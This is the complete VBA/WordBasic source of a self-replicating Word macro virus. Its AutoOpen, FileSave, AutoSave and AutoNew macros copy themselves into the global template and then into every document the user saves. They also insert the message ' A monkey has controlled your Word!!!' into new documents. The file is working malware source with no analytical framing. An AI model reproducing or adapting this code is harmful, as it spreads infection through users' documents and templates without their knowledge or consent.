   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "?????????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   WordBasic.FileSave
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
   WordBasic.MacroCopy "AutoNew", WordBasic.[FileName$]() + ":AutoNew"
   WordBasic.MacroCopy "FileSave", WordBasic.[FileName$]() + ":FileSave"
   WordBasic.MacroCopy "AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "AutoSave", WordBasic.[FileName$]() + ":AutoSave"
   End Sub

   Attribute VB_Name = "AutoSave"

   Public Sub MAIN()
   WordBasic.SetDocumentVar "Saved", "Ok"
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   If WordBasic.[MacroFileName$]("AutoOpen") = WordBasic.[FileName$]() _
     And WordBasic.[MacroFileName$]("FileSave") = WordBasic.[FileName$]() _
     And WordBasic.[MacroFileName$]("AutoNew") = WordBasic.[FileName$]() _
     And WordBasic.[MacroFileName$]("AutoSave") = WordBasic.[FileName$]() _
   Then
     WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "AutoOpen"
     WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "FileSave"
     WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "AutoNew"
     WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoSave", "AutoSave"
   End If
   End Sub


   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()
   WordBasic.Insert " A monkey has controlled your Word!!!"
   End Sub
